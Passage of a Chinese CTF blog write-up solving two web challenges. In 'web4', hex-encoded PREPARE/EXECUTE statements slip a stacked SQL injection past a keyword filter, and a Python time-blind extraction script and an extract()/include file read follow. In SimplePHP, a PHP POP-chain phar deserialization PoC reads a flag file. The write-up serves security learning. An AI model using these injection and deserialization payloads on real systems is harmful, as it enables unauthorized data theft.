<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>在username处加个’报错，两个’正常，猜测存在sql注入，题目提示PDO,猜测可能是用堆叠查询。因为PDO默认支持多语句查询，如果php版本小<br>于5.5.21或者创建PDO实例时未设置PDO::MYSQL_ATTR_MULTI_STATEMENTS为false时可能会造成堆叠注入。<br>引号中输入;，发现没有500错误，说明支持堆叠查询。使用PDO执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结果，因为PDO<br>只会返回第一条SQL语句执行的结果，所以第二条语句中可以用update更新数据或者使用时间盲注获取数据<a href="https://xz.aliyun.com/t/3950#toc-2" target="_blank" rel="noopener">PDO下堆叠查询</a><br>但是过滤了select,if,sleep等一系列关键字，用十六进制+mysql预处理来完成绕过。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#select sleep(10)</span></span><br><span class="line"><span class="string">'1'</span>;<span class="built_in">set</span> @a=0x73656c65637420736c65657028313029;PREPARE stmt1 FROM @a;EXECUTE stmt1;-- <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set @a=0x73656c65637420736c65657028313029</span></span><br><span class="line"><span class="string">设置一个变量</span></span><br><span class="line"><span class="string">PREPARE stmt1 FROM @a</span></span><br><span class="line"><span class="string">预定义一个语句，并将它赋给stmt1，值为@a变量值</span></span><br><span class="line"><span class="string">EXECUTE stmt1</span></span><br><span class="line"><span class="string">执行stmt1，如果 stmt1 不存在，将会引发一个错误。</span></span><br></pre></td></tr></table></figure></p>
<p>测试成功<br>附上别的师傅的时间盲注脚本<br>因为师傅的脚本报错了，转hex部分有问题，我做了修改<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://75aeec92-830a-48a7-94fd-35d83d17d71d.node3.buuoj.cn/index.php?r=Login/Login'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">pos = 1</span><br><span class="line">def str_to_hex(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">        j=32</span><br><span class="line">        try:</span><br><span class="line">            <span class="comment">#flag</span></span><br><span class="line">            <span class="comment">#exp = "select if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,sleep(4),1)" % (pos, i)</span></span><br><span class="line">            <span class="comment">#flag</span></span><br><span class="line">            <span class="comment">#exp = "select if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_name='flag'),%d,1))=%d,sleep(4),1)" % (pos, i)</span></span><br><span class="line">            <span class="comment">#glzjin_wants_a_girl_friend.zip</span></span><br><span class="line">            exp = <span class="string">"select if(ascii(substring((select flag from flag limit 0,1),%d,1))=%d,sleep(4),1)"</span> % (pos, i)</span><br><span class="line">            exp1 = <span class="string">"0x"</span>+str(str_to_hex(exp))</span><br><span class="line">            data = <span class="string">''</span><span class="string">'&#123;"username":"1'</span>;<span class="built_in">set</span> @a=%s;PREPARE stmt1 FROM @a;EXECUTE stmt1;-- <span class="string">","</span>password<span class="string">":"</span>a<span class="string">"&#125;''' % (exp1)</span></span><br><span class="line"><span class="string">            res = requests.post(url=url, data=data,  timeout=4)</span></span><br><span class="line"><span class="string">        except:</span></span><br><span class="line"><span class="string">            flag += chr(i)</span></span><br><span class="line"><span class="string">            print flag</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            print i</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">    pos += 1</span></span><br></pre></td></tr></table></figure></p>
<p>python 字符转hex<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def str_to_hex(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">' '</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">def hex_to_str(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, 16) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">' '</span>)]])</span><br><span class="line"></span><br><span class="line">def str_to_bin(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">' '</span>.join([bin(ord(c)).replace(<span class="string">'0b'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">def bin_to_str(s):</span><br><span class="line">    <span class="built_in">return</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, 2) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">' '</span>)]])</span><br></pre></td></tr></table></figure></p>
<p>接下来是审计源码，先看控制器，可以看到BaseController.php中有一段很明显的代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> loadView(<span class="variable">$viewName</span> =<span class="string">''</span>, <span class="variable">$viewData</span> = [])</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;viewPath = BASE_PATH . <span class="string">"/View/&#123;<span class="variable">$viewName</span>&#125;.php"</span>;</span><br><span class="line">		<span class="keyword">if</span>(file_exists(<span class="variable">$this</span>-&gt;viewPath))</span><br><span class="line">		&#123;</span><br><span class="line">			extract(<span class="variable">$viewData</span>);</span><br><span class="line">			include <span class="variable">$this</span>-&gt;viewPath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>含有extract函数和include函数，全局搜索一下都在哪里调用了loadView<br><img src="https://uploader.shimo.im/f/JZZ3GcLPyrk9cueG.png" alt><br>跟进<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> actionIndex()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$listData</span> = <span class="variable">$_REQUEST</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;loadView(<span class="string">'userIndex'</span>,<span class="variable">$listData</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>这里listdata是可控的，userindex是包含的文件，看一下userindex.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$img_file</span>)) &#123;</span><br><span class="line">                    <span class="variable">$img_file</span> = <span class="string">'/../favicon.ico'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$img_dir</span> = dirname(__FILE__) . <span class="variable">$img_file</span>;</span><br><span class="line">                <span class="variable">$img_base64</span> = imgToBase64(<span class="variable">$img_dir</span>);</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'&lt;img src="'</span> . <span class="variable">$img_base64</span> . <span class="string">'"&gt;'</span>;       //图片形式展示</span><br></pre></td></tr></table></figure></p>
<p>其中imgToBase64()实现的是将目标文件转化成base64格式。只需要将$img_file改成/flag.php即可<br>$listData = $_REQUEST;接收img_file=/../flag.php，extract($viewData);覆盖img_file，然后输出flag.php的base64编码</p>
<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>简单看下有两个功能，上传文件，查看文件，f12源码提示flag在f1ag.php，在查看文件处url?file=很可疑，试了下存在文件包含<br>读到关键代码如下<br>file.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$show</span> = new Show();  </span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="variable">$file</span>)) &#123;  </span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="built_in">source</span> = <span class="variable">$file</span>;  </span><br><span class="line">    <span class="variable">$show</span>-&gt;_show();  </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!empty(<span class="variable">$file</span>))&#123;  </span><br><span class="line">    die(<span class="string">'file doesn\'</span>t exists.<span class="string">');  </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>class.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">class C1e4r </span><br><span class="line">&#123; </span><br><span class="line">    public <span class="variable">$test</span>; </span><br><span class="line">    public <span class="variable">$str</span>; </span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$name</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;str = <span class="variable">$name</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> __destruct() </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="built_in">test</span> = <span class="variable">$this</span>-&gt;str; </span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;<span class="built_in">test</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class Show </span><br><span class="line">&#123; </span><br><span class="line">    public <span class="variable">$source</span>; </span><br><span class="line">    public <span class="variable">$str</span>; </span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="variable">$file</span>;   //<span class="variable">$this</span>-&gt;<span class="built_in">source</span> = phar://phar.jpg </span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;<span class="built_in">source</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> __toString() </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$content</span> = <span class="variable">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;<span class="built_in">source</span>; </span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$content</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> __set(<span class="variable">$key</span>,<span class="variable">$value</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> _show() </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="variable">$this</span>-&gt;<span class="built_in">source</span>)) &#123; </span><br><span class="line">            die(<span class="string">'hacker!'</span>); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            highlight_file(<span class="variable">$this</span>-&gt;<span class="built_in">source</span>); </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> __wakeup() </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="variable">$this</span>-&gt;<span class="built_in">source</span>)) &#123; </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"hacker~"</span>; </span><br><span class="line">            <span class="variable">$this</span>-&gt;<span class="built_in">source</span> = <span class="string">"index.php"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">class Test </span><br><span class="line">&#123; </span><br><span class="line">    public <span class="variable">$file</span>; </span><br><span class="line">    public <span class="variable">$params</span>; </span><br><span class="line">    public <span class="keyword">function</span> __construct() </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;params = array(); </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> __get(<span class="variable">$key</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;get(<span class="variable">$key</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> get(<span class="variable">$key</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123; </span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$this</span>-&gt;params[<span class="variable">$key</span>]; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="variable">$value</span> = <span class="string">"index.php"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;file_get(<span class="variable">$value</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    public <span class="keyword">function</span> file_get(<span class="variable">$value</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>)); </span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$text</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>主要控制上传文件的function.php，白名单上传仅限图片<br>看到file_exists($file)，自然就想到phar反序列化<br>下面开始构造pop链<br>test::file_get可以读文件，一直往上回溯到<strong>get<br>show::</strong>toString中$content = $this-&gt;str[‘str’]-&gt;source;可以触发<strong>get<br>C1e4r::</strong>destruct中 echo $this-&gt;test; 触发__toString<br>poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Test </span><br><span class="line">&#123; </span><br><span class="line">    public <span class="variable">$file</span>; </span><br><span class="line">    public <span class="variable">$params</span>; </span><br><span class="line">&#125; </span><br><span class="line">class Show </span><br><span class="line">&#123;</span><br><span class="line">public <span class="variable">$source</span>; </span><br><span class="line">public <span class="variable">$str</span>; </span><br><span class="line">&#125;</span><br><span class="line">class C1e4r </span><br><span class="line">&#123; </span><br><span class="line">public <span class="variable">$test</span>;</span><br><span class="line">public <span class="variable">$str</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=new Test;</span><br><span class="line"><span class="variable">$a</span>-&gt;params[<span class="string">"source"</span>]=<span class="string">"f1ag.php"</span>;</span><br><span class="line"><span class="variable">$b</span>=new Show;</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">'str'</span>]=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>=new C1e4r;</span><br><span class="line"><span class="variable">$c</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">'test.phar'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">'test.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure></p>
<p>访问url/upload/得到上传文件名，再访问file.php?file=phar://upload/文件名，输出base64编码之后的flag</p>
</div><div class="post-copyright"><blockquote><p>Ursprünglicher Autor: cop</p><p>Ursprünglicher Link: <a href="http://yoursite.com/2020/01/12/swpu刷题记录/">http://yoursite.com/2020/01/12/swpu刷题记录/</a></p><p>Copyright-Erklärung: Bitte geben Sie die Quelle des Nachdrucks an.</p></blockquote></div><div class="tags"></div><div class="post-share"><div class="social-share"><span>Aktie:</span></div></div><div class="post-nav"><a href="/2020/01/17/swpu刷题记录2/" class="pre">swpu刷题记录</a><a href="/2020/01/11/SUCTF刷题记录/" class="next">SUCTF刷题记录</a></div><div id="comments"></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">Inhalte</i></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB1"><span class="toc-text">WEB1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB3"><span class="toc-text">WEB3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用软链接完成文件读取"><span class="toc-text">使用软链接完成文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令注入"><span class="toc-text">命令注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web4"><span class="toc-text">web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2018-SimplePHP"><span class="toc-text">[SWPUCTF 2018]SimplePHP</span></a></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/07/29/233/">233</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/20/vulhub复现记录-2/">vulhub复现记录-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/17/java学习笔记/">java学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/13/vulhub复现记录/">vulhub复现记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/03/7月6日周记录/">7月6日周记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/03/刷cve/">buu按顺序刷题知识点小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/24/GKCTF/">GkCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/20/2020网鼎后三场wp/">2020网鼎后三场wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/11/2020网鼎杯wp/">2020网鼎杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/09/。。。/">。。。</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> Tags</i></div><div class="tagcloud"></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> Archiv</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">35</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">8</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-you"> Blogroll</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/baidusitemap.xml">Sitemap</a> |  <a href="/atom.xml">Abonnieren Sie diese Site</a> |  <a href="/about/">Kontaktieren Sie den Blogger</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次，本站总访客数:<i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>人</p><p><span> Copyright &copy;<a href="/." rel="nofollow">cop.</a></span><span> Theme by<a rel="nofollow" target="_blank" href="https://github.com/chaooo/hexo-theme-BlueLake"> BlueLake.</a></span><span> Count by<a href="http://busuanzi.ibruce.info/"> busuanzi.</a></span><span> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a></span></p></div></div></div><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.json.js?v=2.0.5"></script><div id="fullscreen-img" class="hide"><span class="close"></span></div><script type="text/javascript" src="/js/imgview.js?v=2.0.5" async></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.5" async></script><link rel="stylesheet" type="text/css" href="/share/css/share.css"><script type="text/javascript" src="/share/js/social-share.js" charset="utf-8"></script><script type="text/javascript" src="/share/js/qrcode.js" charset="utf-8"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true}});</script></body></html>